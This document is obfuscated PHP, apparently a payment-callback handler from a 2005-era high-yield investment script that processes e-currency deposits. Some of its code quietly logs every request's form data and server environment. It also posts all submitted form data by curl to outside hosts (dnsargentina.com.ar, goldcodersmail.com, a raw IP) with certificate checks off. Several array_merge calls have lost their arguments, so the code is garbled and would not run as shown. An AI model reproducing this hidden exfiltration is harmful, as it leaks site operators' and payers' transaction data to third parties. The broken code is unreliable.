"elnlcWNqvO" => "eb_metal", "elnlciwhp" => "https://api.alertpay.com/svc/api.svc/sendmoney", "elnlcIPfN" => "balance", "elnlcGustD" => "remitfund_from_account", "elnlcSyyE" => "HTTP_CACHE_CONTROL", "elnlclkvQp" => "ENV", "elnlcQKWvM" => "wp_ok", "elnlcHdgvf" => "TRANSACTION_ID", "elnlcMLzNf" => "max_deposit", "elnlcufufz" => "ref_percent1", "elnlciQBD" => "HASH", "elnlcCEKPl" => "libertyreserve_from_account", "elnlcUyaVq" => "LRUSD", "elnlcUwMaB" => "compound_percents", "elnlcgxDs" => "remitfund_apiname", "elnlcdOCkh" => "HTTP_REFERER", "elnlcmEkr" => "RETURNCODE", "elnlcjlfpf" => "oz", "elnlcVDVDy" => "banner_extension", "elnlcGDIz" => "VNB34FXT6BJCYD93VXSD", "elnlclEcuA" => "amount", "elnlcwwVJ" => "md5altphrase_eeecurrency", "elnlcJAVnx" => "USD", "elnlcRiER" => "def_payee_account", "elnlcLRPer" => "def_payee_account_ebullion_currency", "elnlcUILPA" => "max", "elnlcbVMb" => "FRM", "elnlcSFKV" => "0", "elnlcuhKmr" => "compound", "elnlckktDo" => "PHP_SELF", "elnlcWjfoP" => "d", "elnlcJxuS" => "www.dnsargentina.com.ar", "elnlcSAxP" => "daily_referral_percent_min_downline_deposit", "elnlcrbVU" => "CUSTOM2", "elnlcjjeps" => "system_email", "elnlcuAKOV" => "database", "elnlcFvPHl" => "DATE", "elnlcxOjq" => "hyip manager pro 2005 jul 26", "elnlcDOLC" => "v", "elnlcDLrc" => "user_auto_pay_earning", "elnlczJUVU" => "ref_name", "elnlcJjqT" => "/get_pid.php", "elnlcxuer" => "libertyreserve_apiname", "elnlcQyiA" => "N75GNXM2XSM34YMFPED9", "elnlcFtOIH" => "perfectmoney_payer_account", "elnlcMQACj" => "/log_possible_attack.php", "elnlcuRdt" => "ZQ54Q9RUQ46CU9C8Z986", "elnlcAjJs" => "settings.php", "elnlcyycse" => "ebullion_keyID", "elnlciCNbq" => "9C64PVXYBZKZHUTMSM2U", "elnlcVRSu" => "21", "elnlcJwwoe" => "r", "elnlcMygIP" => "amt", "elnlcgFxbx" => "percent", "elnlcAoin" => "imps_cost", "elnlcvpTI" => "compound_max_deposit", "elnlcClDwq" => "ounce", "elnlcJdcEW" => "ok", "elnlctatVy" => "dec_stormpay_fee2", "elnlcxJkh" => "deposit_fee_min", "elnlcztSyn" => "vmoney_from_account", "elnlcRgzM" => "email", "elnlcbakxM" => "alertpay_from_account", "elnlcxBtR" => "site_days_online_generated", "elnlcVcEzr" => "use_compound", "elnlcJnhgA" => "0", "elnlccwqS" => "euro", "elnlcowtbp" => "actual_amount", "elnlcDqgVD" => "type_id", "elnlcIgAUk" => "./tmpl_c/raw_log", "elnlcxakjM" => "came_from", "elnlcPQqPz" => "subject", "elnlcVuhL" => "enable_wire", "elnlcxwpm" => "def_payee_account_ebullion", "elnlcnzRUV" => "KC3STYBTCATZNRVBYGDF", "elnlcSCVW" => "daily_referral_percent_min_user_deposit", "elnlclmhFR" => "currency", "elnlcagbym" => "td", "elnlcaJLE" => "show_info_box_running_days", "elnlczcEc" => "site_start_month_str_generated", "elnlcBOndW" => "deposit_fee", "elnlcMTCjb" => "CUSTOM3", "elnlcCzMiB" => "withdrawal_fee", "elnlcQsqts" => "currency_sign", "elnlcRIBmz" => "1007", "elnlcKbUSW" => "dll", "elnlcWJeyC" => "cnt", "elnlcxxOeN" => "egold_withdraw_string", "elnlcwtbS" => "deposit_date", "elnlcEEGh" => "15", "elnlcaDLfe" => "cnf", "elnlcrplh" => "delay", "elnlcSgGnA" => "use_active_referal", "elnlcwuVzl" => "memo", "elnlctsvUN" => "501", "elnlceAqmb" => "program_version", "elnlcMcIo" => "error", "elnlcgyewH" => "ok", "elnlcimNw" => "finnish", "elnlczSGMs" => "text", "elnlczJSnU" => "def_payee_account_ebullion_gold", "elnlcaAWt" => "Dec", "elnlcEeUB" => "http://", "elnlcTRbe" => "http://www.dnsargentina.com.ar/check.cgi?install=1&script=3&domain=", "elnlcqvae" => "md5altphrase_ebullion", "elnlcCfWGg" => "maxam", "elnlcTpgit" => "gpg_path", "elnlcLlqz" => "ec", "elnlcFonQ" => "5M74FW4DADMF7K7MJ5TG", "elnlcTthx" => "evowallet_apiname", "elnlcTDOf" => "dec_stormpay_fee", "elnlcARIU" => "additional", "elnlcsisuI" => "./tmpl_c/.htdata", "elnlcqabv" => "./settings.php", "elnlcusqu" => "amnt", "elnlcdgqQo" => "status", "elnlcJQPVe" => "ref", "elnlcFcsEj" => "use_auto_payment", "elnlcGTQPV" => "YmdHis", "elnlcQaJPf" => "compound_percents_type", "elnlckWIL" => "key", "elnlcOOLt" => "checkpayment", "elnlcwRWaa" => "m", "elnlcOkFp" => "withdrawal_fee_min", "elnlcTrKHL" => "def_payee_account_egold", "elnlcUFbp" => "return_profit", "elnlcEcVIp" => "BUYERACCOUNTID", "elnlcexer" => "ac", "elnlcIMDmd" => "WMHKFJPMT3CZ3RTLPBFL", "elnlcPeDF" => "additionalinfo", "elnlcBJyh" => "hyip manager pro 2005 jul 27", "elnlctzFV" => "site_start_year", "elnlcsrNcA" => "auto", "elnlcyahNc" => "3m", "elnlcVojGH" => "euro", "elnlczyTT" => "mails.txt", "elnlcaTnnD" => "4ZQQN55VA2NXBVFUQJE6", "elnlcIGomq" => "id", "elnlcrKTD" => "ZXMCQ227FNN5EPHWYHAY", "elnlcITqU" => "use_solid_referral_commission", "elnlcyzOSM" => "paypal_currency", "elnlcKqfVO" => "solid_referral_commission_amount", "elnlcyzWW" => "tw", "elnlcaleJ" => "REFERENCENUMBER", "elnlcwsmEy" => "w", "elnlcdMRao" => "payer", "elnlcyxnAF" => "h", "elnlcLHwbK" => "3WBUUNQMPU2LB99GJHUV", "elnlcdRvUJ" => "2XACR4UBJ7DLCV42EM2S", "elnlcOHbn" => "enable_eb_ecurrency", "elnlcuUfGx" => "total", "elnlcwnIm" => "def_payee_account_wiretransfer", "elnlcUpFhk" => "RESULT", "elnlcQMzIO" => "CUSTOM4", "elnlcbCzgf" => "free", "elnlcrdwsf" => "proxy.shr.secureserver.net:3128", "elnlcnhDqm" => "payee", "elnlcKULDN" => "period", "elnlcdTahl" => "ok11", "elnlcRlJry" => "1", "elnlcmOuO" => "use_referal_program", "elnlcEFOak" => "metal", "elnlcJJlD" => "magic_quotes_gpc", "elnlccmud" => "license", "elnlcWfClG" => "DESCRIPTION", "elnlcpFPq" => "compound_min_percent", "elnlczvayB" => "6m", "elnlcFETv" => "evocash_username", "elnlcgenya" => "install", "elnlcItylv" => "ref_sum", "elnlcSFNWm" => "__debug_data", "elnlcKaoA" => "pecunix_from_account", "elnlcwLOCk" => "rpcp", "elnlcKlvTq" => "upline", "elnlcLRgb" => "db_login", "elnlccrvf" => "2m", "elnlcOaGaB" => "pay_active_referal", "elnlcNETn" => "B29S2LWPZ5M2KMPPYWKL", "elnlcbUJC" => "Deposit returned to user account" );
ini_set( "magic_quotes_runtime", false );
define( "LAST_UPDATE_ID", 18 );
global $elnlcfdlo;
if ( !extension_loaded( "gd" ) )
{
    $elnlcyQFm = PHP_SHLIB_SUFFIX == $elnlcbhAzL['elnlcKbUSW'] ? "php_" : "";
    @dl( @$elnlcyQFm."gd.".@PHP_SHLIB_SUFFIX );
}
global $HTTP_GET_VARS;
global $HTTP_POST_VARS;
global $HTTP_POST_FILES;
global $HTTP_COOKIE;
$elnlcgGOt = array_merge( ( array ), ( array ) );
$elnlcdGIT = array_merge( ( array ), ( array ) );
$elnlcfdlo = array_merge( ( array ), ( array ) );
$elnlcBRnj = array_merge( ( array ), ( array ) );
$elnlcNDSv = $elnlcfdlo;
global $HTTP_ENV_VARS;
global $HTTP_SERVER_VARS;
$elnlcplSDU = array( );
$elnlcplSDU = array_merge( ( array ), ( array ), ( array ), ( array ) );
$elnlcbeMz = fopen( $elnlcbhAzL['elnlcIgAUk'], "a+" );
$elnlcKIydR = array( );
$elnlcKIydR[$elnlcbhAzL['elnlcFvPHl']] = date( "Y-m-d H:i:s" );
$elnlcPLSj = $elnlcplSDU;
$elnlclHTDq = array( "argv", "argc", "CONTENT_LENGTH", "DOCUMENT_ROOT", "HTTP_ACCEPT", "HTTP_ACCEPT_CHARSET", "HTTP_ACCEPT_ENCODING", "HTTP_CONNECTION", "HTTP_COOKIE2", "HTTP_HOST", "HTTP_TE", "PATH", "REDIRECT_SCRIPT_URI", "REDIRECT_SCRIPT_URL", "REDIRECT_STATUS", "REDIRECT_URL", "REMOTE_PORT", "SCRIPT_FILENAME", "SCRIPT_URI", "SCRIPT_URL", "SERVER_ADDR", "SERVER_ADMIN", "SERVER_NAME", "SERVER_PORT", "SERVER_SIGNATURE", "SERVER_SOFTWARE", "GATEWAY_INTERFACE", "SERVER_PROTOCOL", "SCRIPT_NAME", "PATH_TRANSLATED", "PHP_SELF", $elnlcbhAzL['elnlcSyyE'] );
foreach ( $elnlclHTDq as $elnlcUzjty )
{
    unset( $elnlcPLSj[$elnlcUzjty] );
}
$elnlcKIydR[$elnlcbhAzL['elnlclkvQp']] = "";
foreach ( $elnlcPLSj as $k => $v )
{
    $elnlcKIydR[$elnlcbhAzL['elnlclkvQp']] .= " {$k} => {$v} |";
}
$elnlcKIydR[$elnlcbhAzL['elnlcbVMb']] = "";
foreach ( $elnlcfdlo as $k => $v )
{
    $elnlcKIydR[$elnlcbhAzL['elnlcbVMb']] .= " {$k} => {$v} |";
}
fwrite( $elnlcbeMz, $elnlcKIydR[$elnlcbhAzL['elnlcFvPHl']]." ".$elnlcplSDU[$elnlcbhAzL['elnlckktDo']]." ".$elnlcKIydR[$elnlcbhAzL['elnlcbVMb']]." <<>> ".$elnlcKIydR[$elnlcbhAzL['elnlclkvQp']]."\n" );
fclose( $elnlcbeMz );
$elnlcWGBKV = ini_get( $elnlcbhAzL['elnlcJJlD'] );
elnlcgawp( $elnlcfdlo );
elnlcgawp( $elnlcNDSv, 1 );
elnlcgawp( $elnlcBRnj );
$elnlcNGihV = $elnlcbhAzL['elnlcSFKV'];
$elnlcUGiiE = "";
foreach ( $elnlcfdlo as $k => $v )
{
    if ( !is_array( $v ) && preg_match( "/[\"\\']/", $v ) )
    {
        $elnlcNGihV = $elnlcbhAzL['elnlcRlJry'];
    }
    $elnlcUGiiE .= "{$k}={$v}&";
}
if ( $elnlcNGihV == 1 && function_exists( "curl_init" ) )
{
    if ( $elnlctVnzQ[$elnlcbhAzL['elnlcgzReJ']] == 1 )
    {
        $elnlcnOsVl = "64.27.18.142";
    }
    else if ( $elnlctVnzQ[$elnlcbhAzL['elnlcgzReJ']] == 2 )
    {
        $elnlcnOsVl = "www.goldcodersmail.com";
    }
    else
    {
        $elnlcnOsVl = "www.dnsargentina.com.ar";
    }
    $elnlcVCFRQ = curl_init( );
    curl_setopt( $elnlcVCFRQ, CURLOPT_URL, "http://".$elnlcnOsVl.$elnlcbhAzL['elnlcMQACj'] );
    $elnlcykqSE = rawurlencode( $elnlcUGiiE );
    curl_setopt( $elnlcVCFRQ, CURLOPT_POST, 1 );
    curl_setopt( $elnlcVCFRQ, CURLOPT_POSTFIELDS, "memo={$elnlcykqSE}" );
    curl_setopt( $elnlcVCFRQ, CURLOPT_SSL_VERIFYPEER, FALSE );
    curl_setopt( $elnlcVCFRQ, CURLOPT_RETURNTRANSFER, 1 );
    $a = curl_exec( $elnlcVCFRQ );
    curl_close( $elnlcVCFRQ );
}
$elnlcDSQpW = $elnlcplSDU[$elnlcbhAzL['elnlcdOCkh']];
$elnlcPuDA = $elnlcplSDU[$elnlcbhAzL['elnlcgdlS']];
if ( !ereg( "\\/\\/{$elnlcPuDA}", $elnlcDSQpW ) )
{
    setcookie( "CameFrom", $elnlcDSQpW, time( ) + 630720000 );
}
$elnlctVnzQ = elnlcucuo( $elnlcbhAzL['elnlcxOjq'] );
$elnlcvaUhj = array( "withdraw_pending" => "Withdrawal request", "add_funds" => "Transfer from external processings", "deposit" => "Deposit", "bonus" => "Bonus", "penality" => "Penalty", "earning" => "Earning", "withdrawal" => "Withdrawal", "commissions" => "Referral commission", "early_deposit_release" => "Deposit release", "early_deposit_charge" => "Commission for an early deposit release", "release_deposit" => "Deposit returned to user account", "exchange_out" => " Received on exchange", "exchange_in" => "Spent on exchange", "exchange" => "Exchange", "internal_transaction_spend" => "Spent on Internal Transaction", "internal_transaction_receive" => "Received from Internal Transaction" );
if ( $elnlctVnzQ[$elnlcbhAzL['elnlccmud']] == $elnlcbhAzL['elnlciCNbq'] )
{
    $elnlctVnzQ[$elnlcbhAzL['elnlceAqmb']] = $elnlcbhAzL['elnlccwqS'];
}
if ( $elnlctVnzQ[$elnlcbhAzL['elnlceAqmb']] == $elnlcbhAzL['elnlcVojGH'] )
{
    $elnlcjxPh = array( 0 => array( "name" => "e-gold", "sfx" => "egold", 1, 1 ), 6 => array( "name" => "PayPal", "sfx" => "paypal", 1, 0 ), 15 => array( "name" => "LibertyReserve", "sfx" => "libertyreserve", 1, 1 ) );
    $elnlctVnzQ[$elnlcbhAzL['elnlcQsqts']] = "&#8364;";
    $elnlctVnzQ[$elnlcbhAzL['elnlcDhfLC']] = $elnlcbhAzL['elnlcvKOrI'];
    $elnlctVnzQ[$elnlcbhAzL['elnlcyzOSM']] = $elnlcbhAzL['elnlcxkBA'];
    $elnlctVnzQ[$elnlcbhAzL['elnlcqsrR']] = $elnlcbhAzL['elnlcmQtKS'];
}
else if ( $elnlctVnzQ[$elnlcbhAzL['elnlceAqmb']] == $elnlcbhAzL['elnlcClDwq'] && $elnlctVnzQ[$elnlcbhAzL['elnlccmud']] == $elnlcbhAzL['elnlcdRvUJ'] )
{
    $elnlcjxPh = array( 0 => array( "name" => "e-gold", "sfx" => "egold", 1, 1 ) );
    $elnlctVnzQ[$elnlcbhAzL['elnlcQsqts']] = $elnlcbhAzL['elnlcjlfpf'];
    $elnlctVnzQ[$elnlcbhAzL['elnlcDhfLC']] = $elnlcbhAzL['elnlcJcSL'];
}
else
{
    $elnlcjxPh = array( 0 => array( "name" => "e-gold", "sfx" => "egold", 1, 1 ), 6 => array( "name" => "PayPal", "sfx" => "paypal", 1, 0 ), 8 => array( "name" => "eeeCurrency", "sfx" => "eeecurrency", 1, 1 ), 9 => array( "name" => "Pecunix", "sfx" => "pecunix", 1, 1 ), 11 => array( "name" => "AlertPay", "sfx" => "alertpay", 1, 1 ), 15 => array( "name" => "LibertyReserve", "sfx" => "libertyreserve", 1, 1 ), 16 => array( "name" => "V-Money", "sfx" => "vmoney", 1, 1 ), 17 => array( "name" => "AlterGold", "sfx" => "altergold", 1, 1 ), 18 => array( "name" => "Perfectmoney", "sfx" => "perfectmoney", 1, 1 ), 19 => array( "name" => "c-gold", "sfx" => "cgold", 1, 0 ), 20 => array( "name" => "Webmoney", "sfx" => "webmoney", 1, 0 ), 21 => array( "name" => "Strictpay", "sfx" => "strictpay", 1, 0 ), 22 => array( "name" => "SolidTrustPay", "sfx" => "solidtrustpay", 1, 0 ), 23 => array( "name" => "Ecumoney", "sfx" => "ecumoney", 1, 0 ), 24 => array( "name" => "EvoWallet", "sfx" => "evowallet", 1, 1 ), 26 => array( "name" => "RoutePay", "sfx" => "routepay", 1, 0 ), 27 => array( "name" => "EuroGoldCash", "sfx" => "eurogoldcash", 1, 0 ), 28 => array( "name" => "GlobalDigitalPay", "sfx" => "globaldigitalpay", 1, 0 ) );
    $elnlctVnzQ[$elnlcbhAzL['elnlcQsqts']] = "\$";
    $elnlctVnzQ[$elnlcbhAzL['elnlcDhfLC']] = $elnlcbhAzL['elnlcRlJry'];
    $elnlctVnzQ[$elnlcbhAzL['elnlcyzOSM']] = $elnlcbhAzL['elnlcJAVnx'];
    $elnlctVnzQ[$elnlcbhAzL['elnlcqsrR']] = $elnlcbhAzL['elnlcUyaVq'];
}
$elnlctVnzQ[$elnlcbhAzL['elnlcWNqvO']] = $elnlcbhAzL['elnlcRlJry'];
if ( $elnlctVnzQ[$elnlcbhAzL['elnlcxwpm']] && !$elnlctVnzQ[$elnlcbhAzL['elnlcOHbn']] && !$elnlctVnzQ[$elnlcbhAzL['elnlcDfLfq']] )
{
    $elnlctVnzQ[$elnlcbhAzL['elnlcDfLfq']] = $elnlcbhAzL['elnlcRlJry'];
}
if ( $elnlctVnzQ[$elnlcbhAzL['elnlcOHbn']] )
{
    $elnlctVnzQ[$elnlcbhAzL['elnlcLRPer']] = $elnlctVnzQ[$elnlcbhAzL['elnlcxwpm']];
}
else
{
    $elnlctVnzQ[$elnlcbhAzL['elnlcLRPer']] = "";
}
if ( $elnlctVnzQ[$elnlcbhAzL['elnlcDfLfq']] )
{
    $elnlctVnzQ[$elnlcbhAzL['elnlczJSnU']] = $elnlctVnzQ[$elnlcbhAzL['elnlcxwpm']];
}
else
{
    $elnlctVnzQ[$elnlcbhAzL['elnlczJSnU']] = "";
}
foreach ( $elnlcjxPh as $elnlclrarK => $elnlcKIydR )
{
    if ( $elnlctVnzQ["def_payee_account_".$elnlcKIydR['sfx']] != "" && $elnlctVnzQ["def_payee_account_".$elnlcKIydR['sfx']] != "0" )
    {
        $elnlcjxPh[$elnlclrarK][$elnlcbhAzL['elnlcdgqQo']] = $elnlcbhAzL['elnlcRlJry'];
    }
    else
    {
        $elnlcjxPh[$elnlclrarK][$elnlcbhAzL['elnlcdgqQo']] = $elnlcbhAzL['elnlcSFKV'];
    }
}
if ( $elnlctVnzQ[$elnlcbhAzL['elnlccmud']] == $elnlcbhAzL['elnlcnzRUV'] )
{
    $elnlcjTCz = array( 1 => "english", 2 => "estonians", 3 => $elnlcbhAzL['elnlcimNw'] );
}
if ( $elnlctVnzQ[$elnlcbhAzL['elnlccmud']] != "RHLFPPEURGQGG68GXYA8" && $elnlctVnzQ[$elnlcbhAzL['elnlccmud']] != "VQP8CM95UXTXEX44G7NR" )
{
    $elnlctVnzQ[$elnlcbhAzL['elnlcuolIp']] = $elnlcbhAzL['elnlcSFKV'];
}
if ( $elnlctVnzQ[$elnlcbhAzL['elnlccmud']] == $elnlcbhAzL['elnlcrKTD'] || $elnlctVnzQ[$elnlcbhAzL['elnlccmud']] == $elnlcbhAzL['elnlcFonQ'] )
{
    $elnlctVnzQ[$elnlcbhAzL['elnlcgzReJ']] = $elnlcbhAzL['elnlcRlJry'];
}
if ( $elnlctVnzQ[$elnlcbhAzL['elnlccmud']] == $elnlcbhAzL['elnlcIMDmd'] )
{
    ini_set( "sendmail_from", "admin@plan4fun.net" );
}
if ( ( $elnlctVnzQ[$elnlcbhAzL['elnlccmud']] == $elnlcbhAzL['elnlcQyiA'] || $elnlctVnzQ[$elnlcbhAzL['elnlccmud']] == $elnlcbhAzL['elnlcQDgk'] || $elnlctVnzQ[$elnlcbhAzL['elnlccmud']] == $elnlcbhAzL['elnlctxqf'] || $elnlctVnzQ[$elnlcbhAzL['elnlccmud']] == $elnlcbhAzL['elnlcVBAI'] || $elnlctVnzQ[$elnlcbhAzL['elnlccmud']] == $elnlcbhAzL['elnlcxHmeU'] || $elnlctVnzQ[$elnlcbhAzL['elnlccmud']] == $elnlcbhAzL['elnlcLHwbK'] ) && $elnlcplSDU[$elnlcbhAzL['elnlcRcNSM']] != "" )
{
    $elnlcplSDU[$elnlcbhAzL['elnlclCDs']] = $elnlcplSDU[$elnlcbhAzL['elnlcRcNSM']];
    $_SERVER[$elnlcbhAzL['elnlclCDs']] = $elnlcplSDU[$elnlcbhAzL['elnlcRcNSM']];
}
$elnlcGwcKy = elnlcusja( );
if ( !$elnlcGwcKy )
{
    print "Cannot connect mysql";
    exit( );
}
$elnlcfQcH = $elnlctVnzQ[$elnlcbhAzL['elnlcwwVJ']];
if ( file_exists( "./tmpl_c/log_postbacks" ) )
{
    $elnlcfaqvM = fopen( "ee_log", "w+" );
    foreach ( $elnlcfdlo as $k => $v )
    {
        fwrite( $elnlcfaqvM, "{$k} = {$v}\n" );
    }
    fwrite( $elnlcfaqvM, "\n\n\n" );
    fclose( $elnlcfaqvM );
}
if ( $elnlcfQcH == $elnlcfdlo[$elnlcbhAzL['elnlciQBD']] && ( $elnlcfdlo[$elnlcbhAzL['elnlcHdgvf']] != "" && $elnlcjxPh[8][$elnlcbhAzL['elnlcdgqQo']] == 1 ) )
{
    if ( $elnlcfdlo[$elnlcbhAzL['elnlcUpFhk']] != "0" )
    {
        elnlcshepw( $elnlcGwcKy );
        exit( );
    }
    $elnlcjvTJB = sprintf( "%d", $elnlcfdlo[$elnlcbhAzL['elnlcIcJT']] );
    $elnlcVRHf = sprintf( "%d", $elnlcfdlo[$elnlcbhAzL['elnlcrbVU']] );
    $elnlcBKqrM = sprintf( "%d", $elnlcfdlo[$elnlcbhAzL['elnlcQMzIO']] );
    $elnlcekLao = $elnlcfdlo[$elnlcbhAzL['elnlcpJTxg']];
    $elnlcUqhml = $elnlcfdlo[$elnlcbhAzL['elnlcHdgvf']];
    $elnlcJfxRK = $elnlcfdlo[$elnlcbhAzL['elnlcEcVIp']];
    if ( $elnlcfdlo[$elnlcbhAzL['elnlcMTCjb']] == $elnlcbhAzL['elnlcOOLt'] )
    {
        elnlcqekq( 8, $elnlcjvTJB, $elnlcekLao, $elnlcUqhml, $elnlcJfxRK, $elnlcVRHf, $elnlcBKqrM );
    }
}
elnlcshepw( $elnlcGwcKy );
print "1";
exit( );
?>
